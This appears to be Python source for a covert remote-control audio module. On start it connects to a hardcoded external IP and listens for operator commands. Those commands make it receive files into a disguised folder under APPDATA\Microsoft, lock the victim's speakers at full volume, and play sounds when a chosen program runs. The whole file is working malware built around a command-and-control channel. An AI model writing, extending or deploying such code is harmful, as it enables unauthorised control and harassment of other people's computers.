from managed_socket import Socket
from playsound import playsound
from threading import Thread
import os
import random
import time
import psutil

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def milliseconds():
  return round(time.time() * 1000)

class Audio(Thread):
  def __init__(self):
    Thread.__init__(self)

    self.path = os.getenv('APPDATA') + "\\Microsoft\\Audios\\Songs"

    self.socket = Socket("201.83.5.29", 27593, "audio")
    self.socket.on("data", self.onData)
    self.socket.start()

    self.autoPlayer = False
    self.autoPlayAudio = "hack1"
    self.triggerProcessName = None
    self.lastTimePlayed = 0
    self.interval = 10000

    self.receiveFile = False
    self.file = None
    self.lastWrite = 0

    self.enableRandomSounds = False
    self.randomSounds = []

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    self.volume = cast(interface, POINTER(IAudioEndpointVolume))
    self.defaultVolume = self.volume.GetMasterVolumeLevel()
    self.maxVolume = False

  def play(self, audio):
    path = self.path + f"\\{audio}.mp3"
    if os.path.exists(path):
      playsound(path)

  def _play(self, data):
    Thread(target=self.play, args=(data[0], )).start()

  def _autoPlay(self, data):
    if data[0] == "on":
      self.autoPlayer = True
      self.socket.s.sendall(b'message;autoPlayOn')
    elif data[0] == "off":
      self.autoPlayer = False
      self.socket.s.sendall(b'message;autoPlayOff')

  def _autoPlayInterval(self, data):
    try:
      self.interval = int(data[0])
      self.socket.s.sendall(b'message;autoPlayIntervalSet')
    except:
      pass

  def _autoPlayAudio(self, data):
    self.autoPlayAudio = data[0]
    self.socket.s.sendall(b'message;autoPlayAudioSet')

  def _autoPlayProcess(self, data):
    self.triggerProcessName = data[0]
    self.socket.s.sendall(b'message;autoPlayProcessSet')

  def _addRandomSound(self, data):
    if not data[0] in self.randomSounds:
      self.randomSounds.append(data[0])
      self.socket.s.sendall(b'message;randomSoundAdded')
    else:
      self.socket.s.sendall(b'message;duplicateRandomSound')

  def _removeRandomSound(self, data):
    if data[0] in self.randomSounds:
      del self.randomSounds[self.randomSounds.index(data[0])]
      self.socket.s.sendall(b'message;randomSoundRemoved')
    else:
      self.socket.s.sendall(b'message;randomSoundNotFound')

  def _listRandomSounds(self, data):
    buf = "message;"
    for sound in self.randomSounds:
      buf += f"{sound}.mp3\n"

    self.socket.sendall(bytes(buf, encoding='utf-8'))

  def _enableRandomSounds(self, data):
    self.enableRandomSounds = True
    self.socket.s.sendall(b'message;enabledRandomSounds')

  def _disableRandomSounds(self, data):
    self.enableRandomSounds = False
    self.socket.s.sendall(b'message;disabledRandomSounds')

  def _maxVol(self, data):
    self.maxVolume = True

  def _minVol(self, data):
    self.maxVolume = False

  def _uploadSong(self, data):
    filePath = self.path + f"\\{data[0]}.mp3"

    if not os.path.exists(filePath):
      self.receiveFile = True
      self.socket.enablePing = False
      self.socket.decodeData = False
      self.file = open(self.path + f"\\{data[0]}.mp3", "wb")
      self.lastWrite = milliseconds()

      self.socket.s.sendall(
        bytes(f'requestWrite;{data[0]}', encoding='utf-8')
      )
    else:
      self.socket.s.sendall(
        bytes(f'fileReceived;failed;0', encoding='utf-8')
      )

  def onData(self, data):
    if not self.receiveFile:
      if hasattr(self, f'_{data[0]}'):
        func = getattr(self, f'_{data[0]}')
        try:
          func(data[1:])
        except:
          pass
      else:
        self.socket.s.sendall(b'message;[Auto Player] Invalid command')
    else:
      self.file.write(data)
      self.lastWrite = milliseconds()

  def manageVolume(self):
    #pythoncom.CoInitialize()

    while True:
      if self.maxVolume:
        self.volume.SetMasterVolumeLevel(-0.0, None)
      else:
        self.volume.SetMasterVolumeLevel(self.defaultVolume, None)

      time.sleep(0.25)

  def run(self):
    Thread(target=self.manageVolume).start()
    
    while True:
      if self.autoPlayer and self.triggerProcessName and milliseconds() - self.lastTimePlayed > self.interval:
        for proc in psutil.process_iter():
          if proc.name() == self.triggerProcessName:
            audio = self.autoPlayAudio
            if self.enableRandomSounds:
              audio = self.randomSounds[random.randint(0, len(self.randomSounds) - 1)]
            
            Thread(target=self.play, args=(audio, )).start()

            self.lastTimePlayed = milliseconds()

            break

      if self.receiveFile and milliseconds() - self.lastWrite >= 3000:
        self.socket.enablePing = True
        self.socket.decodeData = True
        self.receiveFile = False
        self.socket.s.sendall(bytes(f'fileReceived;success;{str(self.file.tell())}', encoding="utf-8"))
        self.file.close()

      time.sleep(0.5)

if __name__ == "__main__":
  Audio().start()